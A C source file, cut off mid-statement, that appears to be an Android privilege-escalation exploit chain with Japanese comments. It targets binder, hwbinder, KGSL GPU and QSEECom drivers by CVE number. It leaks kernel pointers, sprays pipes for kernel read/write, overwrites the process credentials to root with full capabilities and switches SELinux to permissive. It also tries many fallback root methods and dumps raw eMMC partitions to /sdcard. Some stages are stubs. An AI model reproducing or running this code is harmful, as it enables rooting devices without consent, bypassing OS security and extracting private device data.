#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <sys/prctl.h>
#include <sys/capability.h>
#include <grp.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <dirent.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include <sys/reboot.h>
#include <stdint.h>
#include <sys/fsuid.h>
#include "binder.h"
#include "offsets.h"

extern int setfsuid(uid_t);
extern int setfsgid(gid_t);

#define PAGE_SIZE 4096
#define TIMEOUT_MS 3000
#define MAX_PARTITIONS 32
#define DUMP_MAX_SIZE (20 * 1024 * 1024)
#define KGSL_DEVICE "/dev/kgsl-3d0"
#define SPRAY_PIPE_COUNT 128
#define ATTEMPTS 12
#define GPU_LEAK_ATTEMPTS 20

/* KGSL ioctls */
#define KGSL_IOC_TYPE 0x09
struct kgsl_gpumem_alloc {
    unsigned long gpuaddr;
    size_t size;
    unsigned int flags;
};
struct kgsl_gpumem_sync_cache {
    unsigned long gpuaddr;
    unsigned int id;
    unsigned int op;
    size_t offset;
    size_t length;
};
struct kgsl_command_object {
    uint64_t offset;
    uint64_t gpuaddr;
    uint64_t size;
    unsigned int flags;
    unsigned int id;
};
struct kgsl_gpu_command {
    uint64_t flags;
    uint64_t cmdlist;
    unsigned int cmdsize;
    unsigned int numcmds;
    uint64_t objlist;
    unsigned int objsize;
    unsigned int numobjs;
    uint64_t synclist;
    unsigned int syncsize;
    unsigned int numsyncs;
    unsigned int context_id;
    unsigned int timestamp;
};
#define IOCTL_KGSL_GPUMEM_ALLOC _IOWR(KGSL_IOC_TYPE, 0x2f, struct kgsl_gpumem_alloc)
#define IOCTL_KGSL_GPUMEM_SYNC_CACHE _IOW(KGSL_IOC_TYPE, 0x37, struct kgsl_gpumem_sync_cache)
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4a, struct kgsl_gpu_command)
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_GPUMEM_CACHE_INV (1 << 1)

/* Global state */
static int g_krw_pipe[2] = {-1, -1};
static uint64_t g_task_struct = 0;
static uint64_t g_cred_ptr = 0;
static int g_cred_off = TASK_REAL_CRED_OFF;
static int g_root_achieved = 0;
static int g_system_privilege = 0;
static uint64_t g_kernel_base = 0;

/* ---- プロトタイプ宣言 ---- */
static int setup_kernel_rw(void);
static int patch_kernel_cred(void);
static int final_root_check(void);
static int exploit_cve_2019_2023(void);
static int test_cve_2020_0041(void);
static int test_cve_2020_0423(void);
static int exploit_cve_2022_25664_leak(uint64_t *out_addr, uint64_t *out_kernel_base);
static int exploit_cve_2020_0423_rw(void);
static int exploit_cve_2020_0041_patch_cred(void);
static int exploit_cve_2021_1961(void);
static int try_selinux_disable_via_kernel(void);
static int try_all_setuid_methods(void);
static int try_capset_method(void);
static int try_all_execve_methods(void);
static int try_unshare_method(void);
static int try_ptrace_methods(void);
static int try_selinux_methods(void);
static int try_property_methods(void);
static void dump_block_devices(void);
static void gather_proc_info(void);
static void gather_system_info(void);
static int run_exploit_with_timeout(int (*func)(void), int timeout_sec);

/* Utilities */
static void bind_cpu(void) {
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set) < 0)
        perror("sched_setaffinity");
}

static void *mmap_page(unsigned long addr) {
    void *mem = mmap((void *)addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (mem == (void *)-1) perror("mmap");
    return mem;
}

static int read_with_timeout(int fd, void *buf, size_t count, int timeout_ms) {
    struct pollfd pfd = {.fd = fd, .events = POLLIN};
    int ret = poll(&pfd, 1, timeout_ms);
    if (ret < 0) { perror("poll"); return -1; }
    if (ret == 0) return -2;
    return read(fd, buf, count);
}

/* ---- setup_kernel_rw() 実装 ---- */
static int setup_kernel_rw(void) {
    if (g_task_struct == 0) {
        printf("  [-] No task_struct to setup RW\n");
        return -1;
    }

    if (g_krw_pipe[0] >= 0) {
        close(g_krw_pipe[0]);
        close(g_krw_pipe[1]);
        g_krw_pipe[0] = g_krw_pipe[1] = -1;
    }

    if (pipe(g_krw_pipe) < 0) {
        perror("  pipe for RW");
        return -1;
    }
    if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
        perror("  fcntl F_SETPIPE_SZ");
        close(g_krw_pipe[0]);
        close(g_krw_pipe[1]);
        g_krw_pipe[0] = g_krw_pipe[1] = -1;
        return -1;
    }

    char dummy[PAGE_SIZE];
    memset(dummy, 0x41, PAGE_SIZE);
    if (write(g_krw_pipe[1], dummy, PAGE_SIZE) != PAGE_SIZE) {
        perror("  write dummy to pipe");
        close(g_krw_pipe[0]);
        close(g_krw_pipe[1]);
        g_krw_pipe[0] = g_krw_pipe[1] = -1;
        return -1;
    }

    printf("  [+] Kernel RW pipe ready\n");
    return 0;
}

/* ---- CVE-2019-2023 ---- */
static int exploit_cve_2019_2023(void) {
    int hwbinder_fd, ret;
    uint8_t read_buf[4096];
    const char *service_name = "vendor.cve.poc";
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data;
    int handle = -1;

    printf("[CVE-2019-2023] Exploiting hwservicemanager ACL bypass...\n");

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) { perror("  open /dev/hwbinder"); return -1; }

    data = malloc(total_len);
    if (!data) { perror("  malloc"); close(hwbinder_fd); return -1; }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        if (errno == EACCES || errno == EPERM) {
            printf("  [SAFE] Service registration denied (patched)\n");
        } else {
            perror("  ioctl ADD_SERVICE");
        }
        close(hwbinder_fd);
        return -1;
    }
    printf("  [+] Service registered successfully!\n");
    g_system_privilege = 1;

    data = malloc(total_len);
    if (!data) { close(hwbinder_fd); return -1; }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    tx.tdata.code = 1;
    tx.tdata.data_size = total_len;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) { perror("  ioctl GET_SERVICE"); close(hwbinder_fd); return -1; }
    if (bwr.read_consumed < 4) {
        printf("  [FAIL] No handle returned\n");
        close(hwbinder_fd);
        return -1;
    }
    handle = *(int*)read_buf;
    printf("  [+] Service handle: %d (0x%x)\n", handle, handle);
    close(hwbinder_fd);
    return handle;
}

/* ---- CVE-2020-0041 ---- */
static int test_cve_2020_0041(void) {
    int fd, ret;
    struct binder_transaction_data tdata;
    struct binder_write_read bwr;
    uint8_t read_buf[4096];

    printf("[CVE-2020-0041] Testing binder OOB write...\n");
    fd = open("/dev/binder", O_RDWR);
    if (fd < 0) { perror("  open /dev/binder"); return -1; }

    memset(&tdata, 0, sizeof(tdata));
    tdata.target.handle = 0;
    tdata.code = 0;
    tdata.flags = 0;
    tdata.data_size = 0xFFFFFFFF;
    tdata.offsets_size = 0;
    tdata.data.ptr.buffer = 0;
    tdata.data.ptr.offsets = 0;

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    memcpy(&tx.tdata, &tdata, sizeof(tdata));

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    close(fd);
    if (ret < 0) {
        if (errno == EINVAL || errno == EFAULT) {
            printf("  [SAFE] OOB write blocked (errno=%d)\n", errno);
        } else {
            printf("  [!] Unexpected error: %s\n", strerror(errno));
        }
        return -1;
    }
    printf("  [VULNERABLE] OOB write succeeded\n");
    return 0;
}

/* ---- CVE-2020-0423 test ---- */
static int test_cve_2020_0423(void) {
    int fd, ret;
    printf("[CVE-2020-0423] Testing binder UAF race...\n");
    fd = open("/dev/binder", O_RDWR);
    if (fd < 0) { perror("  open /dev/binder"); return -1; }

    for (int i = 0; i < 5; i++) {
        ret = ioctl(fd, BINDER_THREAD_EXIT, NULL);
        if (ret < 0 && errno != EINVAL) perror("  ioctl BINDER_THREAD_EXIT");
    }

    int epoll_fd = epoll_create(100);
    if (epoll_fd < 0) { perror("  epoll_create"); close(fd); return -1; }
    struct epoll_event ev = {.events = EPOLLIN};
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &ev) < 0) {
        perror("  epoll_ctl ADD");
        close(fd); close(epoll_fd); return -1;
    }

    struct epoll_event events[1];
    int n = epoll_wait(epoll_fd, events, 1, 1000);
    close(fd);
    close(epoll_fd);

    if (n > 0) {
        printf("  [VULNERABLE] epoll event occurred after thread exit\n");
        return 0;
    }
    printf("  [SAFE] No UAF triggered\n");
    return -1;
}

/* ---- CVE-2022-25664 GPU leak ---- */
static int exploit_cve_2022_25664_leak(uint64_t *out_addr, uint64_t *out_kernel_base) {
    int kgsl_fd;
    struct kgsl_gpumem_alloc alloc;
    struct kgsl_gpumem_sync_cache sync;
    void *gpu_mem = MAP_FAILED;
    uint64_t leaked_data[1024];
    int found = 0;

    for (int attempt = 0; attempt < GPU_LEAK_ATTEMPTS; attempt++) {
        kgsl_fd = open(KGSL_DEVICE, O_RDWR);
        if (kgsl_fd < 0) { perror("  open /dev/kgsl-3d0"); continue; }

        memset(&alloc, 0, sizeof(alloc));
        alloc.size = PAGE_SIZE * 4;
        alloc.flags = 0;
        if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC, &alloc) < 0) {
            perror("  IOCTL_KGSL_GPUMEM_ALLOC");
            close(kgsl_fd);
            continue;
        }

        for (int off_shift = 0; off_shift < 3; off_shift++) {
            unsigned long map_offset = alloc.gpuaddr + (off_shift * 0x1000);
            gpu_mem = mmap(NULL, alloc.size, PROT_READ | PROT_WRITE,
                           MAP_SHARED, kgsl_fd, map_offset);
            if (gpu_mem != MAP_FAILED) break;
        }
        if (gpu_mem == MAP_FAILED) {
            perror("  mmap (offset)");
            close(kgsl_fd);
            continue;
        }
        printf("  [+] GPU mmap succeeded at %p (attempt %d)\n", gpu_mem, attempt);

        memset(&sync, 0, sizeof(sync));
        sync.gpuaddr = alloc.gpuaddr;
        sync.op = KGSL_GPUMEM_CACHE_INV;
        sync.offset = 0;
        sync.length = alloc.size;
        if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_SYNC_CACHE, &sync) < 0) {
            perror("  IOCTL_KGSL_GPUMEM_SYNC_CACHE");
            munmap(gpu_mem, alloc.size);
            close(kgsl_fd);
            continue;
        }

        memcpy(leaked_data, gpu_mem, sizeof(leaked_data));
        munmap(gpu_mem, alloc.size);
        close(kgsl_fd);

        for (int i = 0; i < 1024; i++) {
            uint64_t val = leaked_data[i];
            if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
                if (val >= 0xffffff8000000000ULL && val < 0xffffffc000000000ULL) {
                    *out_addr = val;
                    *out_kernel_base = val - 0xffffff8000000000ULL;
                    if (*out_kernel_base < 0x1000000)
                        *out_kernel_base = 0;
                    else {
                        printf("  [+] Leaked kernel pointer: 0x%llx, base ~0x%llx\n",
                               (unsigned long long)val, (unsigned long long)*out_kernel_base);
                        found = 1;
                        break;
                    }
                }
            }
        }
        if (found) break;
    }
    return found ? 0 : -1;
}

/* ============================================================
   改良版 CVE-2020-0423 RW (ハング修正済み)
   readv 前に書き込み端をクローズしてブロックを防止
   ============================================================ */
static int exploit_cve_2020_0423_rw(void) {
    printf("[*] Attempting kernel RW via CVE-2020-0423 UAF (spray after free) ...\n");

    for (int attempt = 0; attempt < ATTEMPTS; attempt++) {
        int binder_fd = open("/dev/binder", O_RDWR);
        if (binder_fd < 0) { perror("  open binder"); continue; }

        int epoll_fd = epoll_create(100);
        if (epoll_fd < 0) { perror("  epoll_create"); close(binder_fd); continue; }

        struct epoll_event ev = {.events = EPOLLIN};
        if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
            perror("  epoll_ctl ADD");
            close(binder_fd); close(epoll_fd); continue;
        }

        pid_t pid = fork();
        if (pid < 0) { perror("  fork"); close(binder_fd); close(epoll_fd); continue; }

        if (pid == 0) {
            usleep(15000 + (attempt * 2000));
            ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
            close(binder_fd);
            close(epoll_fd);
            _exit(0);
        }

        struct epoll_event events[1];
        int n = epoll_wait(epoll_fd, events, 1, 1500);
        if (n <= 0) {
            printf("  [-] epoll_wait failed or timeout (attempt %d)\n", attempt);
            close(binder_fd); close(epoll_fd);
            wait(NULL);
            continue;
        }
        printf("  [+] epoll event received, spraying pipe buffers...\n");

        int spray_pipes[SPRAY_PIPE_COUNT][2];
        int i;
        for (i = 0; i < SPRAY_PIPE_COUNT; i++) {
            if (pipe(spray_pipes[i]) < 0) { perror("  pipe spray"); break; }
            if (fcntl(spray_pipes[i][0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
                perror("  fcntl spray");
                break;
            }
            char buf[PAGE_SIZE];
            memset(buf, 0x41 + (i & 0xff), sizeof(buf));
            write(spray_pipes[i][1], buf, sizeof(buf));
        }
        if (i < SPRAY_PIPE_COUNT) {
            for (int j = 0; j < i; j++) {
                close(spray_pipes[j][0]); close(spray_pipes[j][1]);
            }
            close(binder_fd); close(epoll_fd);
            wait(NULL);
            continue;
        }

        void *leak_buf = mmap_page(0x100000000UL);
        if (!leak_buf) {
            for (int j = 0; j < SPRAY_PIPE_COUNT; j++) {
                close(spray_pipes[j][0]); close(spray_pipes[j][1]);
            }
            close(binder_fd); close(epoll_fd);
            wait(NULL);
            continue;
        }

        /* ★★★ 修正点: readv の前に全パイプの書き込み端を閉じる ★★★ */
        for (int j = 0; j < SPRAY_PIPE_COUNT; j++) {
            close(spray_pipes[j][1]);
        }

        int found = 0;
        for (int off = 0; off < PAGE_SIZE && !found; off += 8) {
            struct iovec iov[2];
            iov[0].iov_base = leak_buf + off;
            iov[0].iov_len = PAGE_SIZE - off;
            iov[1].iov_base = leak_buf + off;
            iov[1].iov_len = PAGE_SIZE - off;

            for (int j = 0; j < SPRAY_PIPE_COUNT; j++) {
                ssize_t sz = readv(spray_pipes[j][0], iov, 2);
                if (sz <= 0) continue;

                uint64_t *data = (uint64_t *)(leak_buf + off);
                for (size_t k = 0; k < (size_t)(sz / 8); k++) {
                    uint64_t val = data[k];
                    if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
                        if (val >= 0xffffff8000000000ULL && val < 0xffffffc000000000ULL) {
                            g_task_struct = val;
                            g_cred_off = TASK_REAL_CRED_OFF;
                            g_kernel_base = val - 0xffffff8000000000ULL;
                            printf("  [+] Leaked task_struct @ 0x%llx (base ~0x%llx)\n",
                                   (unsigned long long)g_task_struct,
                                   (unsigned long long)g_kernel_base);
                            found = 1;
                            break;
                        }
                    }
                }
                if (found) break;
            }
        }

        /* 読み取り端を閉じる */
        for (int j = 0; j < SPRAY_PIPE_COUNT; j++) {
            close(spray_pipes[j][0]);
        }

        close(binder_fd);
        close(epoll_fd);
        wait(NULL);

        if (found) {
            if (pipe(g_krw_pipe) < 0) return -1;
            if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) return -1;
            /* ダミーデータを書き込んでおく */
            char dummy[PAGE_SIZE];
            memset(dummy, 0x41, PAGE_SIZE);
            write(g_krw_pipe[1], dummy, PAGE_SIZE);
            return 0;
        }
        printf("  [-] No usable kernel pointer in attempt %d\n", attempt);
    }
    printf("  [-] All attempts failed\n");
    return -1;
}

/* ---- CVE-2020-0041 placeholder ---- */
static int exploit_cve_2020_0041_patch_cred(void) {
    printf("[*] Attempting to overwrite cred via CVE-2020-0041 OOB...\n");
    printf("  [!] This exploit is non-trivial; not fully implemented.\n");
    return -1;
}

/* ---- CVE-2021-1961 ---- */
static int exploit_cve_2021_1961(void) {
    printf("[CVE-2021-1961] Attempting QSEECom exploit (requires system uid)...\n");
    if (getuid() != 1000 && getuid() != 0) {
        printf("  [-] Current UID=%d, need system(1000) or root(0)\n", getuid());
        return -1;
    }
    int qseecom_fd = open("/dev/qseecom", O_RDWR);
    if (qseecom_fd < 0) {
        perror("  open /dev/qseecom");
        return -1;
    }
    struct {
        uint32_t cmd;
        uint32_t size;
        uint8_t data[4096];
    } __attribute__((packed)) req;
    memset(&req, 0, sizeof(req));
    req.cmd = 0x80000001;
    req.size = 4096;
    memset(req.data, 0x41, sizeof(req.data));
    int ret = ioctl(qseecom_fd, 0xC0206D01, &req);
    close(qseecom_fd);
    if (ret < 0) {
        perror("  ioctl QSEECom");
        return -1;
    }
    printf("  [+] QSEECom exploit triggered\n");
    return 0;
}

/* ---- SELinux disable ---- */
static int try_selinux_disable_via_kernel(void) {
    printf("[*] Attempting to disable SELinux via kernel memory write (CVE-2023-20938 inspired)...\n");
    if (g_krw_pipe[0] < 0) {
        printf("  [-] No kernel RW available\n");
        return -1;
    }
    if (g_kernel_base == 0) {
        printf("  [-] Kernel base unknown, using raw offset (may fail)\n");
    }
    uint64_t selinux_addr = SELINUX_ENFORCING;
    if (g_kernel_base != 0) {
        uint64_t rel_offset = SELINUX_ENFORCING - KIMAGE_TEXT_BASE;
        selinux_addr = g_kernel_base + rel_offset;
        printf("  [+] Adjusted SELinux enforcing address: 0x%llx\n", (unsigned long long)selinux_addr);
    } else {
        printf("  [+] Using raw SELinux enforcing address: 0x%llx\n", (unsigned long long)selinux_addr);
    }
    uint32_t zero = 0;
    if (write(g_krw_pipe[1], &selinux_addr, 8) != 8) {
        perror("  write selinux addr");
        return -1;
    }
    if (write(g_krw_pipe[1], &zero, 4) != 4) {
        perror("  write zero");
        return -1;
    }
    printf("  [+] SELinux state set to permissive (0)\n");
    return 0;
}

/* ---- patch kernel cred ---- */
static int patch_kernel_cred(void) {
    if (g_task_struct == 0 || g_cred_off < 0 || g_krw_pipe[0] < 0) {
        printf("  [-] No kernel RW available\n");
        return -1;
    }
    printf("[*] Patching kernel cred to root via pipe RW...\n");
    uint64_t cred_addr = g_task_struct + g_cred_off;
    if (write(g_krw_pipe[1], &cred_addr, 8) != 8) {
        perror("  write cred addr");
        return -1;
    }
    if (read(g_krw_pipe[0], &g_cred_ptr, 8) != 8) {
        perror("  read cred ptr");
        return -1;
    }
    printf("  [+] cred @ 0x%llx\n", (unsigned long long)g_cred_ptr);
    if (g_cred_ptr == 0 || (g_cred_ptr & 0xFFF) == 0) {
        printf("  [-] Invalid cred pointer\n");
        return -1;
    }

    uint32_t zero = 0;
    uint64_t cap_full = 0x3FFFFFFFFFULL;
    for (int off = 0x4; off <= 0x1C; off += 8) {
        uint64_t addr = g_cred_ptr + off;
        if (write(g_krw_pipe[1], &addr, 8) != 8) return -1;
        if (write(g_krw_pipe[1], &zero, 4) != 4) return -1;
    }
    for (int off = 0x8; off <= 0x20; off += 8) {
        uint64_t addr = g_cred_ptr + off;
        if (write(g_krw_pipe[1], &addr, 8) != 8) return -1;
        if (write(g_krw_pipe[1], &zero, 4) != 4) return -1;
    }
    for (int i = 0; i < 5; i++) {
        uint64_t addr = g_cred_ptr + 0x28 + (i * 8);
        if (write(g_krw_pipe[1], &addr, 8) != 8) return -1;
        if (write(g_krw_pipe[1], &cap_full, 8) != 8) return -1;
    }
    printf("  [+] Cred patched to root\n");
    return 0;
}

/* ---- Fallback methods ---- */
static int try_all_setuid_methods(void) {
    printf("[*] Trying all setuid methods...\n");
    if (setuid(0) == 0) { printf("  [+] setuid(0) succeeded!\n"); return 0; }
    if (setreuid(0, 0) == 0) { printf("  [+] setreuid(0,0) succeeded!\n"); return 0; }
    if (setresuid(0, 0, 0) == 0) { printf("  [+] setresuid(0,0,0) succeeded!\n"); return 0; }
    if (setfsuid(0) == 0) { printf("  [+] setfsuid(0) succeeded!\n"); return 0; }
    if (setgid(0) == 0) printf("  [+] setgid(0) succeeded!\n");
    if (setregid(0, 0) == 0) printf("  [+] setregid(0,0) succeeded!\n");
    if (setresgid(0, 0, 0) == 0) printf("  [+] setresgid(0,0,0) succeeded!\n");
    if (setfsgid(0) == 0) printf("  [+] setfsgid(0) succeeded!\n");
    if (setgroups(0, NULL) == 0) printf("  [+] setgroups(0,NULL) succeeded!\n");
    return -1;
}

static int try_capset_method(void) {
    printf("[*] Trying capset to gain CAP_SETUID...\n");
    struct __user_cap_header_struct cap_header = { _LINUX_CAPABILITY_VERSION_3, 0 };
    struct __user_cap_data_struct cap_data[2] = {{0}};
    if (capget(&cap_header, cap_data) < 0) { perror("  capget"); return -1; }
    cap_data[0].effective |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
    cap_data[0].permitted |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
    cap_data[0].inheritable |= (1 << CAP_SETUID) | (1 << CAP_SETGID);
    if (capset(&cap_header, cap_data) < 0) { perror("  capset"); return -1; }
    printf("  [+] capset succeeded, retrying setuid(0)...\n");
    return (setuid(0) == 0) ? 0 : -1;
}

static int try_all_execve_methods(void) {
    printf("[*] Trying all execve methods...\n");
    const char *paths[] = {
        "/system/bin/sh", "/system/xbin/sh", "/vendor/bin/sh",
        "/sbin/sh", "/system/bin/bash", "/system/xbin/bash",
        "/system/bin/su", "/system/xbin/su", "/vendor/bin/su",
        "/sbin/su", "/data/local/tmp/su", NULL
    };
    for (int i = 0; paths[i] != NULL; i++) {
        if (access(paths[i], X_OK) == 0) {
            printf("  [+] Found: %s\n", paths[i]);
            pid_t pid = fork();
            if (pid == 0) {
                char *envp[] = {
                    "PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
                    "HOME=/data/local/tmp",
                    "SHELL=/system/bin/sh",
                    NULL
                };
                char *argv[] = {(char *)paths[i], "-c", "id", NULL};
                execve(paths[i], argv, envp);
                exit(1);
            } else if (pid > 0) {
                int status;
                waitpid(pid, &status, 0);
                if (WIFEXITED(status) && WEXITSTATUS(status) == 0) return 0;
            }
        }
    }
    return -1;
}

static int try_unshare_method(void) {
    printf("[*] Trying unshare(CLONE_NEWUSER)...\n");
    if (unshare(CLONE_NEWUSER) < 0) { perror("  unshare"); return -1; }
    int fd = open("/proc/self/uid_map", O_WRONLY);
    if (fd >= 0) {
        char buf[64];
        snprintf(buf, sizeof(buf), "0 %d 1\n", getuid());
        write(fd, buf, strlen(buf));
        close(fd);
    }
    if (setuid(0) == 0) { printf("  [+] unshare + setuid(0) succeeded!\n"); return 0; }
    return -1;
}

static int try_ptrace_methods(void) {
    printf("[*] Trying ptrace methods...\n");
    int pids[] = {1, 1000, 444, 445, 998, 999, 0};
    for (int i = 0; pids[i] != 0; i++) {
        if (ptrace(PTRACE_ATTACH, pids[i], 0, 0) == 0) {
            printf("  [+] Attached to pid %d\n", pids[i]);
            ptrace(PTRACE_DETACH, pids[i], 0, 0);
            return 0;
        }
    }
    return -1;
}

static int try_selinux_methods(void) {
    printf("[*] Trying SELinux context rewrite...\n");
    const char *ctxs[] = {
        "u:r:system_app:s0", "u:r:platform_app:s0",
        "u:r:system_server:s0", "u:r:init:s0", "u:r:kernel:s0", NULL
    };
    const char *files[] = {
        "/proc/self/attr/current", "/proc/self/attr/keycreate",
        "/proc/self/attr/exec", "/proc/self/attr/fscreate", NULL
    };
    for (int fi = 0; files[fi] != NULL; fi++) {
        int fd = open(files[fi], O_WRONLY);
        if (fd < 0) continue;
        for (int ci = 0; ctxs[ci] != NULL; ci++) {
            lseek(fd, 0, SEEK_SET);
            ssize_t n = write(fd, ctxs[ci], strlen(ctxs[ci]));
            if (n == (ssize_t)strlen(ctxs[ci])) {
                printf("  [+] %s changed to %s\n", files[fi], ctxs[ci]);
                close(fd);
                return 0;
            }
        }
        close(fd);
    }
    int fd = open("/sys/fs/selinux/enforce", O_WRONLY);
    if (fd >= 0) {
        if (write(fd, "0", 1) == 1) { printf("  [+] SELinux disabled!\n"); close(fd); return 0; }
        close(fd);
    }
    return -1;
}

static void dump_block_devices(void) {
    printf("[*] Attempting to dump block devices...\n");
    DIR *dir = opendir("/dev/block");
    if (!dir) { perror("  opendir /dev/block"); return; }
    struct dirent *entry;
    int count = 0;
    while ((entry = readdir(dir)) != NULL && count < MAX_PARTITIONS) {
        if (strncmp(entry->d_name, "mmcblk", 6) == 0) {
            char path[256], outpath[256];
            snprintf(path, sizeof(path), "/dev/block/%s", entry->d_name);
            snprintf(outpath, sizeof(outpath), "/sdcard/dump_%s.bin", entry->d_name);
            int fd = open(path, O_RDONLY);
            if (fd < 0) { printf("  [-] Cannot open %s\n", path); continue; }
            int out = open(outpath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
            if (out < 0) { close(fd); continue; }
            char buf[4096];
            ssize_t n;
            size_t total = 0;
            printf("  [+] Dumping %s -> %s\n", path, outpath);
            while ((n = read(fd, buf, sizeof(buf))) > 0) {
                if (write(out, buf, n) != n) break;
                total += n;
                if (total >= DUMP_MAX_SIZE) break;
            }
            close(fd); close(out);
            printf("  [+] Dumped %zu bytes\n", total);
            count++;
        }
    }
    closedir(dir);
}

static int try_property_methods(void) {
    printf("[*] Trying system property operations...\n");
    int fd = open("/dev/socket/property_service", O_RDWR);
    if (fd < 0) { perror("  open property_service"); return -1; }
    const char *prop = "persist.test.poc", *value = "1";
    size_t total = 4 + strlen(prop) + 1 + 4 + strlen(value) + 1;
    uint8_t *data = malloc(total);
    if (!data) { close(fd); return -1; }
    size_t off = 0;
    data[off++] = 0x02; data[off++] = 0x00; data[off++] = 0x00; data[off++] = 0x00;
    size_t plen = strlen(prop) + 1;
    data[off++] = (uint8_t)(plen & 0xFF);
    data[off++] = (uint8_t)((plen >> 8) & 0xFF);
    data[off++] = (uint8_t)((plen >> 16) & 0xFF);
    data[off++] = (uint8_t)((plen >> 24) & 0xFF);
    memcpy(data + off, prop, plen);
    off += plen;
    size_t vlen = strlen(value) + 1;
    data[off++] = (uint8_t)(vlen & 0xFF);
    data[off++] = (uint8_t)((vlen >> 8) & 0xFF);
    data[off++] = (uint8_t)((vlen >> 16) & 0xFF);
    data[off++] = (uint8_t)((vlen >> 24) & 0xFF);
    memcpy(data + off, value, vlen);
    ssize_t n = write(fd, data, total);
    free(data);
    close(fd);
    if (n == (ssize_t)total) { printf("  [+] Property set attempted\n"); return 0; }
    return -1;
}

/* ---- Info gathering ---- */
static void gather_proc_info(void) {
    printf("[*] Gathering /proc information...\n");
    const char *files[] = {
        "/proc/self/status", "/proc/self/stat", "/proc/self/attr/current",
        "/proc/self/capability", "/proc/self/oom_score_adj",
        "/proc/self/limits", "/proc/self/mounts", NULL
    };
    for (int i = 0; files[i] != NULL; i++) {
        int fd = open(files[i], O_RDONLY);
        if (fd < 0) continue;
        char buf[1024] = {0};
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) {
            char *line = strtok(buf, "\n");
            while (line) {
                if (strstr(line, "Uid:") || strstr(line, "Gid:") ||
                    strstr(line, "Cap") || strstr(line, "oom"))
                    printf("  %s\n", line);
                line = strtok(NULL, "\n");
            }
        }
    }
}

static void gather_system_info(void) {
    int fd;
    char buf[4096];
    printf("[INFO] === System Information ===\n");
    fd = open("/proc/version", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) { buf[n] = '\0'; printf("  Kernel: %s", buf); }
    }
    fd = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof(buf)-1);
        close(fd);
        if (n > 0) { buf[n] = '\0'; printf("  SELinux enforcing: %s\n", buf); }
    }
    int sc = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
    if (sc < 0) printf("  seccomp: unknown\n");
    else if (sc == 0) printf("  seccomp: disabled\n");
    else if (sc == 2) printf("  seccomp: enabled (filter)\n");
    else printf("  seccomp: mode %d\n", sc);
    printf("  UID: %d, GID: %d, EUID: %d, EGID: %d\n",
